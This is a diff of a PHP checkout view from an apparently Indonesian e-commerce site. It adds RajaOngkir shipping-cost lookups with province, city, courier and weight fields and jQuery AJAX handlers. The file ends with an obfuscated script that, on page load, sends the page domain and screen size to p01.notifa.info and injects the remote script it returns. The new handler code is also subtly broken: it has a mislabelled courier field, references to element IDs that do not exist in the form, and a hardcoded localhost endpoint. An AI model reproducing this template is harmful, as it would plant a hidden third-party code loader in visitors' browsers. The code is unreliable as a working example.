@@ -229,7 +229,7 @@
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlInput1">Provinsi</label>
-                                <select class="form-control" id="exampleFormControlSelect1">
+                                <select  class="form-control" id="provinsi">
                                   <option>-Pilih Provinsi</option>
                                   <?php foreach ($province->rajaongkir->results as $prov): ?>
                                       
@@ -250,15 +250,13 @@
                           </div>
                           <div class="col-lg-6">
                               <div class="form-group">
-                                <label for="exampleFormControlInput1">Kota</label>
-                                <select class="form-control" id="exampleFormControlSelect1">
-                                  <option>-Pilih Kota</option>
-                                  <?php foreach ($city->rajaongkir->results as $city): ?>
-                                      
-                                    <option value="<?php echo $prov->province_id ?>"><?php echo $city->city_name ?></option>
-                                  
-                                  <?php endforeach ?>
+                                <label>Kabupaten/Kota Tujuan</label>
+                                <select class="form-control" id="kota" name="kota">
+                                <option>-Pilih Kota/Kabupaten</option>
                                 </select>
+
+
+                       
                               </div>
                           </div>
                         </div>
@@ -272,6 +270,17 @@
                           </div>
                           <div class="col-lg-6">
                               <div class="form-group">
+                                <label for="exampleFormControlSelect1">Nomor Telepon</label>
+                                <select id="kurir" class="form-control" name="kurir">
+                                    <option value="jne">JNE</option>
+                                    <option value="tiki">TIKI</option>
+                                    <option value="pos">POS INDONESIA</option>
+                                </select>
+                              </div>
+                          </div>
+
+                          <!-- <div class="col-lg-6">
+                              <div class="form-group">
                                 <label for="exampleFormControlInput1">Kecamatan</label>
                                 <select class="form-control" id="exampleFormControlSelect1">
 
@@ -284,14 +293,23 @@
 
                                 </select>
                               </div>
-                          </div>
+                          </div> -->
+
                         </div>
                         <div class="row">
                             <div class="col-lg-6 col-12">
 
                             <button class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;">SIMPAN</button>
                             </div>
+
+                            <div class="col-lg-6 col-12">
+                                <label>Berat (gram)</label>
+                                <input id="berat" type="text" class="form-control" name="berat" value="500" />
+
+                            </div>
                         </div>
+
+                        <div id="ongkir"></div>
                          
                           
                         </form>
@@ -551,6 +569,49 @@
             });
     });
     </script> 
+
+    <script type="text/javascript">
+ 
+    $(document).ready(function(){
+        $('#provinsi').change(function(){
+ 
+            //Mengambil value dari option select provinsi kemudian parameternya dikirim menggunakan ajax 
+            var prov = $('#provinsi').val();
+ 
+            $.ajax({
+                type : 'GET',
+                url : '<?php echo base_url(); ?>shipping/cek_city',
+                data :  'prov_id=' + prov,
+                    success: function (data) {
+ 
+                    //jika data berhasil didapatkan, tampilkan ke dalam option select kabupaten
+                    $("#kota").html(data);
+                }
+            });
+        });
+
+
+ 
+        $("#cek").click(function(){
+            //Mengambil value dari option select provinsi asal, kabupaten, kurir, berat kemudian parameternya dikirim menggunakan ajax 
+            var asal = $('#asal').val();
+            var kab = $('#kabupaten').val();
+            var kurir = $('#kurir').val();
+            var berat = $('#berat').val();
+ 
+            $.ajax({
+                type : 'POST',
+                url : 'http://localhost/rajaongkir/cek_ongkir.php',
+                data :  {'kab_id' : kab, 'kurir' : kurir, 'asal' : asal, 'berat' : berat},
+                    success: function (data) {
+ 
+                    //jika data berhasil didapatkan, tampilkan ke dalam element div ongkir
+                    $("#ongkir").text(data);
+                }
+            });
+        });
+    });
+</script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
         
         
